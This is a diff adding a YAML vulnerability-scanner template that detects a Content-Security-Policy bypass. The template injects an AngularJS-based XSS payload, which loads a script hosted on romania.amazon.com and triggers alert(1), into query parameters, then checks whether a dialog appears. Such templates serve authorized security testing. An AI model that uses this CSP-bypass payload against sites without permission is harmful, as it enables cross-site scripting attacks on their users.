@@ -1,0 +1,55 @@
+id: amazon-romania-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Amazon Romania
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,amazon-romania
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "amazon.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: amazon_romania_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - <body ng-app ng-csp><script src="https://romania.amazon.com/app/vendor.min.js"></script><input id=x ng-focus=$event.composedPath()|orderBy:\'(z=alert)(1)\'></body>
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "amazon_romania_csp_xss == true"
+# digest: 4b0a004830460221009be4a337333ab4e29f07c645abdc0eb5ac992dc1a12d05f98441bc9598cb05b5022100f6070314376bf21f948b52486361171c0c42acc3386a34f35e201b7f423a02d8:922c64590222798bb761d5b6d8e72950
